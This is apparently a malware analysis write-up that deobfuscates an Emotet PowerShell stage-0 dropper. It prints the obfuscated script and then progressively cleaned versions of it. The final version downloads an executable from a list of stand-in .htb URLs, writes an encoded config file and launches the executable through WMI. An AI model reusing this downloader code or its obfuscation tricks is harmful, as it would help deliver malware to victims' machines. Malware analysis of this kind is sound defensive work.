# Emotet powershell stage 0 dropper

MD5 : be0d176b76768195a6c4496dd582a2d0

========================================

## Deobfuscation

This powershell script looks obfuscated and scrambled, as anything can be recognized at a first glance.

I'll start by fixing the indentation for a better understanding:

```powershell
SV  0zX ([TyPe]("{2}{0}{4}{3}{1}"-f 'e','rECtorY','sYst','.IO.dI','M')  ) ;
set  TxySeo  (  [TYpe]("{0}{7}{5}{6}{4}{2}{1}{8}{3}"-F'SYsTE','TM','IN','ER','pO','NeT.se','RVICE','M.','ANaG')) ;
$Nbf5tg3=('B9'+'yp'+('90'+'s'));
$Vxnlre0=$Cludkjx + [char](64) + $R6r1tuy;$Ky3q0e8=(('Rq'+'dx')+'wo'+'5');
(  Dir  vaRiAble:0Zx).valuE::"CreAT`E`dIREc`T`OrY"($HOME + ((('nDp'+'Jrb')+('e'+'vk4n')+'D'+'p'+('C'+'cwr_2h')+'nD'+'p') -RePlAcE ('n'+'Dp'),[cHaR]92));
$FN5ggmsH = (182,187,229,146,231,177,151,149,166);
$Pyozgeo=(('J5f'+'y1')+'c'+'c');
(  vaRiABLE TxYSEo  ).ValuE::"SecUrI`TYp`R`OtOc`ol" = (('Tl'+'s1')+'2');
$FN5ggmsH += (186,141,228,182,177,171,229,236,239,239,239,228,181,182,171,229,234,239,239,228);
$Huajgb0=(('Jn'+'o')+'5g'+'a1');
$Bb28umo = (('Ale'+'7g')+'_8');
$Hsce_js=('Kv'+('nb'+'ov_'));
$Spk51ue=(('C'+'7xo')+'9g'+'l');
$Scusbkj=$HOME+(('5'+'t'+('f'+'Jrbev'+'k')+('45tf'+'Cc'+'w')+'r'+('_2h'+'5tf')) -rEplACE  ([ChAR]53+[ChAR]116+[ChAR]102),[ChAR]92)+$Bb28umo+(('.e'+'x')+'e');
$FN5ggmsH += (185,179,190,184,229,151,139,157,164,235,177,239,171,183,236,141,128,187,235,134,128,158,177,176,139);
$hbmskV2T=(('C'+'7xo')+'9g'+'l');
$hbmskV2T=$HOME+(('5'+'t'+('f'+'Jrbev'+'k')+('45tf'+'Cc'+'w')+'r'+('_2h'+'5tf')) -rEplACE  ([ChAR]53+[ChAR]116+[ChAR]102),[ChAR]92)+$Bb28umo+(('.c'+'o')+'nf');$Q1_y05_=('W'+('4'+'qvy')+'z8');
$Odb3hf3=&('n'+'e'+'w-object') Net.WEBclIENt;
$FN5ggmsH += (183,154,173,128,175,151,238,140,183,162,228,170,173,179,229);
$Anbyt1y=('h'+('ttp:'+']['+'(s)]')+(('w]'+'[('))+(('s)'+']w'))+('da'+'-')+'i'+'n'+'du'+('s'+'trial.'+'h'+'t')+'b]'+('[(s)]'+'w'+'js')+((']'+'[('))+(('s'+')]w9IdL'+'P]['+'(s'+')]w'+'@h'))+('t'+'tp:]')+('[(s'+')]')+'w'+(']'+'[(s)]')+('wdap'+'ro'+'fesiona'+'l.h')+'tb'+('][(s'+')'+']')+'w'+('d'+'ata')+('4][(s'+')]wh')+('WgW'+'jT')+('V]'+'[')+('(s)]w@http'+'s:][(s'+')]'+'w'+']')+'['+('(s)'+']wdag'+'ra')+'ni'+'t'+('eg'+'ia')+('re.h'+'t')+'b]'+('['+'(s)')+(']ww'+'p-a'+'dm'+'in][(s)'+']wt')+('V]['+'(s'+')')+(']w@'+'h')+'tt'+'p'+(':'+'][')+('(s)]w]['+'(s'+')]www'+'w'+'.out'+'s'+'p')+('ok'+'e')+'nv'+'i'+('s'+'ions.')+('htb'+']')+'['+('(s)]w'+'wp'+'-in')+('clu'+'d')+('es][(s)'+']waW'+'o'+'M')+(']'+'[('+'s)]w')+('@'+'http:]')+('[(s)'+']w][('+'s)')+(']wmo'+'bs')+('o'+'uk.h')+(('t'+'b][('))+(('s)'+']wwp-'))+'in'+'c'+'l'+('ude'+'s]'+'[')+('(s)]'+'w')+('UY'+'30R]')+('[(s'+')]w'+'@'+'h'+'ttp:][')+('('+'s)]w')+(']['+'(s)')+(']'+'wb')+'i'+('g'+'laugh'+'s')+(('.h'+'t'+'b][(s'))+((')]'))+('ws'+'mallpot'+'ato')+'es'+((']'+'[(s'))+((')]wY]'+'[(s'+')]w'+'@h'+'ttps:][(s)'))+']w'+('][('+'s)]wn'+'g')+('ll'+'o')+('gist'+'i')+('cs.'+'h')+'t'+('b]'+'['+'('+'s)]w')+'ad'+('mi'+'n')+'er'+']'+('[(s'+')]w'+'W3m')+'k'+(('B'+'][(s'))+((')'+']w')))."rep`LAcE"((']'+'['+('(s)]'+'w')),([array]('/'),('xw'+'e'))[0])."sP`lIT"($Ivg3zcu + $Vxnlre0 + $Jzaewdy);
$Gcoyvlv=(('Kf'+'_')+('9'+'et1'));
foreach ($A8i3ke1 in $Anbyt1y){
	try{
		$Odb3hf3."dO`WnLOA`dfILe"($A8i3ke1, $Scusbkj);
		$Zhcnaux=(('Ek'+'k')+('j'+'47t'));
		If ((&('Get-I'+'te'+'m') $Scusbkj)."LEn`GTh" -ge 45199) {
			${A8`I`3KE1}.("{1}{2}{0}" -f'ay','ToCha','rArr').Invoke() | .("{2}{1}{0}{3}" -f'-','ach','ForE','Object') -process { 
				${FN5`GGm`Sh} += ([byte][char]${_} -bxor 0xdf ) 
			}; 
			$FN5ggmsH += (228);
			$b0Rje =  [type]("{1}{0}" -F'VerT','Con');   
			$B0RjE::"tO`BaS`E64S`TRI`Ng"(${fn5`ggm`sh}) | .("{2}{1}{0}" -f 'ile','ut-f','o') ${hB`mSK`V2T}; 
			([wmiclass](('wi'+'n')+('32_'+'Proc'+'e')+'s'+'s'))."cR`eaTE"($Scusbkj);
			$Glwki6a=('I'+'m'+('td'+'xv6'));
			break;
			$Pfpblh1=('Vs'+('lal'+'c')+'u')
		}
	} catch {}
}
$F47ief2=(('Bn'+'zid')+'rt')
``` 

By manually searching for variable's cross-refernce, we can remove some unused variables that are initialized with garbage strings:
```powershell
SV  0zX ([TyPe]("{2}{0}{4}{3}{1}"-f 'e','rECtorY','sYst','.IO.dI','M')  ) ;
set  TxySeo  (  [TYpe]("{0}{7}{5}{6}{4}{2}{1}{8}{3}"-F'SYsTE','TM','IN','ER','pO','NeT.se','RVICE','M.','ANaG')) ;
(  Dir  vaRiAble:0Zx).valuE::"CreAT`E`dIREc`T`OrY"($HOME + ((('nDp'+'Jrb')+('e'+'vk4n')+'D'+'p'+('C'+'cwr_2h')+'nD'+'p') -RePlAcE ('n'+'Dp'),[cHaR]92));
(  vaRiABLE TxYSEo  ).ValuE::"SecUrI`TYp`R`OtOc`ol" = (('Tl'+'s1')+'2');
$Scusbkj=$HOME+(('5'+'t'+('f'+'Jrbev'+'k')+('45tf'+'Cc'+'w')+'r'+('_2h'+'5tf')) -rEplACE  ([ChAR]53+[ChAR]116+[ChAR]102),[ChAR]92)+$Bb28umo+(('.e'+'x')+'e');
$hbmskV2T=$HOME+(('5'+'t'+('f'+'Jrbev'+'k')+('45tf'+'Cc'+'w')+'r'+('_2h'+'5tf')) -rEplACE  ([ChAR]53+[ChAR]116+[ChAR]102),[ChAR]92)+$Bb28umo+(('.c'+'o')+'nf');$Q1_y05_=('W'+('4'+'qvy')+'z8');
$Odb3hf3=&('n'+'e'+'w-object') Net.WEBclIENt;
$FN5ggmsH = (182,187,229,146,231,177,151,149,166);
$FN5ggmsH += (186,141,228,182,177,171,229,236,239,239,239,228,181,182,171,229,234,239,239,228);
$FN5ggmsH += (185,179,190,184,229,151,139,157,164,235,177,239,171,183,236,141,128,187,235,134,128,158,177,176,139);
$FN5ggmsH += (183,154,173,128,175,151,238,140,183,162,228,170,173,179,229);
$Anbyt1y=('h'+('ttp:'+']['+'(s)]')+(('w]'+'[('))+(('s)'+']w'))+('da'+'-')+'i'+'n'+'du'+('s'+'trial.'+'h'+'t')+'b]'+('[(s)]'+'w'+'js')+((']'+'[('))+(('s'+')]w9IdL'+'P]['+'(s'+')]w'+'@h'))+('t'+'tp:]')+('[(s'+')]')+'w'+(']'+'[(s)]')+('wdap'+'ro'+'fesiona'+'l.h')+'tb'+('][(s'+')'+']')+'w'+('d'+'ata')+('4][(s'+')]wh')+('WgW'+'jT')+('V]'+'[')+('(s)]w@http'+'s:][(s'+')]'+'w'+']')+'['+('(s)'+']wdag'+'ra')+'ni'+'t'+('eg'+'ia')+('re.h'+'t')+'b]'+('['+'(s)')+(']ww'+'p-a'+'dm'+'in][(s)'+']wt')+('V]['+'(s'+')')+(']w@'+'h')+'tt'+'p'+(':'+'][')+('(s)]w]['+'(s'+')]www'+'w'+'.out'+'s'+'p')+('ok'+'e')+'nv'+'i'+('s'+'ions.')+('htb'+']')+'['+('(s)]w'+'wp'+'-in')+('clu'+'d')+('es][(s)'+']waW'+'o'+'M')+(']'+'[('+'s)]w')+('@'+'http:]')+('[(s)'+']w][('+'s)')+(']wmo'+'bs')+('o'+'uk.h')+(('t'+'b][('))+(('s)'+']wwp-'))+'in'+'c'+'l'+('ude'+'s]'+'[')+('(s)]'+'w')+('UY'+'30R]')+('[(s'+')]w'+'@'+'h'+'ttp:][')+('('+'s)]w')+(']['+'(s)')+(']'+'wb')+'i'+('g'+'laugh'+'s')+(('.h'+'t'+'b][(s'))+((')]'))+('ws'+'mallpot'+'ato')+'es'+((']'+'[(s'))+((')]wY]'+'[(s'+')]w'+'@h'+'ttps:][(s)'))+']w'+('][('+'s)]wn'+'g')+('ll'+'o')+('gist'+'i')+('cs.'+'h')+'t'+('b]'+'['+'('+'s)]w')+'ad'+('mi'+'n')+'er'+']'+('[(s'+')]w'+'W3m')+'k'+(('B'+'][(s'))+((')'+']w')))."rep`LAcE"((']'+'['+('(s)]'+'w')),([array]('/'),('xw'+'e'))[0])."sP`lIT"($Ivg3zcu + $Vxnlre0 + $Jzaewdy);
foreach ($A8i3ke1 in $Anbyt1y){
	try{
		$Odb3hf3."dO`WnLOA`dfILe"($A8i3ke1, $Scusbkj);
		If ((&('Get-I'+'te'+'m') $Scusbkj)."LEn`GTh" -ge 45199) {
			${A8`I`3KE1}.("{1}{2}{0}" -f'ay','ToCha','rArr').Invoke() | .("{2}{1}{0}{3}" -f'-','ach','ForE','Object') -process { 
				${FN5`GGm`Sh} += ([byte][char]${_} -bxor 0xdf ) 
			}; 
			$FN5ggmsH += (228); 
			$b0Rje =  [type]("{1}{0}" -F'VerT','Con');   
			$B0RjE::"tO`BaS`E64S`TRI`Ng"(${fn5`ggm`sh}) | .("{2}{1}{0}" -f 'ile','ut-f','o') ${hB`mSK`V2T}; 
			([wmiclass](('wi'+'n')+('32_'+'Proc'+'e')+'s'+'s'))."cR`eaTE"($Scusbkj);
			break;
		}
	} catch {}
}
```
The `$FN5ggmsH` variables have been put together for a better readability.

Everything looks a bit better for now.

We can spot the fact that strings are concatenated using the '+' operator, with some extra back-ticks '`' that does nothing but making the script harder to understand. We can get ride of thoses:
```powershell
set 0zX = 'System.IO.Directory';
set TxySeo = 'System.Net.ServicePointManager';

(  Dir  variable:0Zx ).value::CreateDirectory($HOME + 'Jrbevk4\Ccwr_2h\');
(  variable TxYSEo ).value::SecurityProtocol = 'Tls12';

$Scusbkj = $HOME + 'Jrbevk4\Ccwr_2h\Ale7g_8.exe';
$hbmskV2T = $HOME + 'Jrbevk4\Ccwr_2h\Ale7g_8.conf';
$Odb3hf3 = 'System.Net.WebClient';

$FN5ggmsH = (182,187,229,146,231,177,151,149,166);
$FN5ggmsH += (186,141,228,182,177,171,229,236,239,239,239,228,181,182,171,229,234,239,239,228);
$FN5ggmsH += (185,179,190,184,229,151,139,157,164,235,177,239,171,183,236,141,128,187,235,134,128,158,177,176,139);
$FN5ggmsH += (183,154,173,128,175,151,238,140,183,162,228,170,173,179,229);

$Anbyt1y = ['http://da-industrial.htb/js/9IdLP/',
        'http://daprofesional.htb/data4/hWgWjTV/',
        'https://dagranitegiare.htb/wp-admin/tV/',
        'http://www.outspokenvisions.htb/wp-includes/aWoM/',
        'http://mobsouk.htb/wp-includes/UY30R/',
        'http://biglaughs.htb/smallpotatoes/Y/',
        'https://ngllogistics.htb/adminer/W3mkB/'];

foreach ($A8i3ke1 in $Anbyt1y){
	try{
		$Odb3hf3.DownloadFile($A8i3ke1, $Scusbkj);
		If ((&('Get-Item') $Scusbkj).Length -ge 45199) {
			${A8I3KE1}.('ToCharArray').Invoke() | .ForEach-Object -process { 
				${FN5GGmSh} += ([byte][char]${_} -bxor 0xdf )
			}; 
			$FN5ggmsH += (228); 
			$b0Rje =  'System.Convert';   
			$BORjE::ToBase64String(${fn5`ggm`sh}) | .out-file ${hB`mSK`V2T}; 
			([wmiclass](('win32_Process')).create($Scusbkj);
			break;
		}
	} catch {}
}
```

We can now replace some lines with the variables values, and get the full readable script that way:
```powershell
System.IO.Directory.value::"CreateDirectory"($HOME + 'Jrbevk4\Ccwr_2h\')
System.Net.ServicePointManager.value::SecurityProtocol = 'Tls12'

$saved_dest_bin = $HOME + 'Jrbevk4\Ccwr_2h\Ale7g_8.exe'
$saved_conf_file = $HOME + 'Jrbevk4\Ccwr_2h\Ale7g_8.conf'

$URL = ['http://da-industrial.htb/js/9IdLP/',
        'http://daprofesional.htb/data4/hWgWjTV/',
        'https://dagranitegiare.htb/wp-admin/tV/',
        'http://www.outspokenvisions.htb/wp-includes/aWoM/',
        'http://mobsouk.htb/wp-includes/UY30R/',
        'http://biglaughs.htb/smallpotatoes/Y/',
        'https://ngllogistics.htb/adminer/W3mkB/']

$conf = [ 182 187 229 146 231 177 151 149 166 186 141 228 182 177 171 229 236 239 239 239 228 181 182 171 229 234 239 239 228 185 179 190 184 229 151 139 157 164 235 177 239 171 183 236 141 128 187 235 134 128 158 177 176 139 183 154 173 
128 175 151 238 140 183 162 228 170 173 179 229 ]

foreach ($web_dest in $URL){
    try{
        System.Net.WebClient::DownloadFile($web_dest, $saved_dest_bin);
        If ((&('Get-Item') $saved_dest_bin).Length -ge 45199) {
            ${web_dest}.('ToCharArray').Invoke() | .ForEach-Object -process { 
                ${conf} += ([byte][char]${_} -bxor 0xdf ) 
            }; 
            $conf += (228);
            System.Convert::ToBase64String(${conf}) | .out-file ${saved_conf_file}; 
            ([wmiclass](('win32_Process')).create($saved_dest_bin);
            break;
        }
    } catch{}
}
```

This script is acting as a simple downloader, saving on disk the emotet stage 1 loader.

Unfortunately, none of the servers where still up (emotet is now down since some time), but I managed to get a copy of one of the samples hosted here:
```
36bedd423ba81c251be1027f6ac079e4  Ale7g_8.bin
```


